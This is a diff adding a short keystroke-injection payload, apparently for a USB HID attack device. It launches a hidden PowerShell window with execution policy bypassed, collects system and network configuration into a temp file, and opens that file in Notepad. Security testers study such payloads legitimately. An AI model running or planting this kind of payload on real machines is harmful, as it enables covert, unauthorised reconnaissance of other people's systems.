@@ -1,0 +1,9 @@
+REM Windows Quick Reconnaissance
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass
+ENTER
+DELAY 1000
+STRING systeminfo > $env:TEMP\recon.txt; ipconfig /all >> $env:TEMP\recon.txt; Start-Process notepad.exe "$env:TEMP\recon.txt"
+ENTER
